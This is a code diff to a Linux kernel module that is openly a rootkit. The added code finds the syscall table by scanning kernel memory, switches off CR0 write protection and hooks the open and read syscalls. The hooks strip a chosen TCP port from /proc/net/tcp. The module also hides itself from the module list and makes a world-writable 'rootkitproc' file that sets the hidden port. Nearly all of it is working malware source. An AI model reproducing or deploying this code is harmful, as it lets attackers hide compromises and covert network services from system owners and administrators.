@@ -1,43 +1,158 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
+#define _GNU_SOURCE
+#include <asm/cacheflush.h>
+#include <asm/current.h>
+#include <asm/page.h>
+#include <asm/uaccess.h>
+#include <linux/dirent.h>
 #include <linux/errno.h>
+#include <linux/fcntl.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <linux/slab.h>
+#include <linux/stat.h>
+#include <linux/syscalls.h>
 #include <linux/types.h>
 #include <linux/unistd.h>
-#include <asm/cacheflush.h>
-#include <asm/page.h>
-#include <asm/current.h>
-#include <linux/sched.h>
-#include <linux/syscalls.h>
-#include <linux/init.h>
-#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 
+#define BUF_SIZE 1024
+#define END_MEM  ULLONG_MAX
 #define START_MEM   PAGE_OFFSET
+#define TCP_LINE_SIZE 150
 #define END_MEM     ULLONG_MAX
+#define PROC_FILE_NAME "rootkitproc"
 
+int PORT_TO_HIDE = 631;
+int TCP_fd = -10;
+static struct proc_dir_entry *proc_file;
+static unsigned long procfs_buffer_size = 0;
 struct list_head *prev_module;
-
 unsigned long long *syscall_table;
 
-unsigned long long **find(void) {
+// original functions
+asmlinkage int (*original_open)(const char *, int);
+asmlinkage long (*original_read)(int, char __user *, size_t);
 
-  unsigned long long **sctable;
+// hijacked open function
+asmlinkage int new_open(const char* path_name, int flags) {
+  // sets the hijack flag indicating that we should hide the TCP port
+  if (strstr(path_name, "tcp") != NULL && strstr(path_name, "tcp6") == NULL) {
+    printk("path name is: %s \n", path_name);
+    TCP_fd = (*original_open)(path_name, flags);
+    return TCP_fd;
+  }
+  return (*original_open)(path_name, flags);
+}
+
+// hijacked read function
+asmlinkage long new_read(int fd, char __user *buf, size_t count) {
+  long ret, temp;
+  long i = 0;
+  char * kernel_buf;
+  ret = original_read(fd, buf, count);
+  if (fd != TCP_fd)
+    return ret;
+  kernel_buf = kmalloc(count, GFP_KERNEL);
+  // Kernel Problem
+  if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
+    printk("FAILLLLLLED KERNEL PROBLEM");
+    return ret;
+  }
+  // ignoring the first line of the file
+  i += TCP_LINE_SIZE;
+
+  for (; i < ret; i = i + TCP_LINE_SIZE) {
+    int j = 0;
+    int val = 0;
+    for (; j < 4; j++) {
+      if (kernel_buf[i + 15 + j] <= 57)
+        val = val + (kernel_buf[i + 15 + j] - 48) * (1 << (4 * (3 - j)));
+      else
+        val = val + (kernel_buf[i + 15 + j] - 55) * (1 << (4 * (3 - j)));
+    }
+    if (val != PORT_TO_HIDE)
+      continue;
+    temp = i;
+    for (; temp < ret - TCP_LINE_SIZE; temp++) {
+      kernel_buf[temp] = kernel_buf[temp + TCP_LINE_SIZE];
+    }
+    for (temp = ret - (TCP_LINE_SIZE + 1); temp < ret; temp++) {
+      kernel_buf[temp] = '\0';
+    }
+    count = count - TCP_LINE_SIZE;
+  }
+  // Kernel Problem
+  if (copy_to_user(buf, kernel_buf, count)) {
+    printk("FAILLLLLLED KERNEL PROBLEM");
+  }
+  kfree(kernel_buf);
+  return ret;
+}
+
+/*                           PROC FILE FUNCTIONS                       */
+int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data) {
+  printk("DONT YOU EVER TRY TO READ THIS FILE OR I AM GOING TO DESTROY YOUR MOST SECRET DREAMS");
+  return 0;
+}
+
+int procfile_write(struct file *file, const char *buf, unsigned long count, void *data) {
+  printk("writing to the proc file\n");
+  char * kernel_buf = kmalloc(count, GFP_KERNEL);
+  bool temp = 0;
+  unsigned long j = 0;
+  int c;
+  if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
+    printk("FAILLLLLLED KERNEL PROBLEM\n");
+    return count;
+  }
+  // hp port number decimal value
+  if (kernel_buf[0] == 'h' &&  kernel_buf[1] == 'p') {
+    PORT_TO_HIDE = 0;
+    for (j = 3; j < count ; j++) {
+      c = kernel_buf[j] - '0';
+      if (c >= 0 && c <= 9)
+        temp = true;
+      if (!temp)
+        break;
+      PORT_TO_HIDE =  PORT_TO_HIDE * 10;
+      PORT_TO_HIDE = PORT_TO_HIDE + c;
+      temp = false;
+    }
+  }
+  printk("NEW TO HIDE IS: %d\n ", PORT_TO_HIDE);
+  printk("finished writing to the proc file\n");
+  return count;
+}
+
+static const struct file_operations proc_file_fops = {
+  .owner = THIS_MODULE,
+  .read = procfile_read,
+  .write = procfile_write,
+};
+
+/*                         END OF PROCFILE FUNCTIONS                     */
+
+unsigned long **find(void) {
+  unsigned long **sctable;
   unsigned long int i = START_MEM;
-
   while ( i < END_MEM) {
-
-    sctable = (unsigned long long **)i;
-
-    if ( sctable[__NR_close] == (unsigned long long *) sys_close) {
-
+    sctable = (unsigned long **)i;
+    if ( sctable[__NR_close] == (unsigned long *) sys_close) {
       return &sctable[0];
     }
-
     i += sizeof(void *);
   }
-
   return NULL;
+}
+
+void disable_write_protection(void) {
+  write_cr0 (read_cr0 () & (~ 0x10000));
+  return;
 }
 
 void hide_module(void) {
@@ -71,44 +186,45 @@ void show_module(void) {
   mutex_unlock(&module_mutex);
 }
 
+void enable_write_protection(void) {
+  write_cr0 (read_cr0 () | 0x10000);
+  return;
+}
+
 static int init(void) {
   hide_module();
-
   printk("\nModule starting...\n");
-
-  syscall_table = (unsigned long long *) find();
-
+  syscall_table = (unsigned long long*) find();
   if ( syscall_table != NULL ) {
-
-    printk("Syscall table found at %llx\n", (unsigned long long ) syscall_table);
-
-
+    printk("Syscall table found at %llx\n", (unsigned long long) syscall_table);
   } else {
-
     printk("Syscall table not found!\n");
-
   }
+  original_read = (void *)syscall_table[__NR_read];
+  original_open = (void *)syscall_table[__NR_open];
+  disable_write_protection();
+  syscall_table[__NR_open] = new_open;
+  syscall_table[__NR_read] = new_read;
+  enable_write_protection();
+
+  proc_file = proc_create( PROC_FILE_NAME, 0666, NULL, &proc_file_fops);
+  if (proc_file == NULL) {
+    remove_proc_entry(PROC_FILE_NAME, NULL);
+    printk("ERROR ALLOCATING FILE");
+    return -ENOMEM;
+  }
+  printk("proc file created\n");
 
   return 0;
 }
 
 static void exit_(void) {
+  disable_write_protection();
+  syscall_table[__NR_open] = original_open;
+  syscall_table[__NR_read] = original_read;
+  enable_write_protection();
   printk("Module ending\n");
-
-  return;
-}
-
-void disable_write_protection(void) {
-
-  write_cr0 (read_cr0 () & (~ 0x10000));
-
-  return;
-}
-
-void enable_write_protection(void) {
-
-  write_cr0 (read_cr0 () | 0x10000);
-
+  remove_proc_entry(PROC_FILE_NAME, NULL);
   return;
 }
 
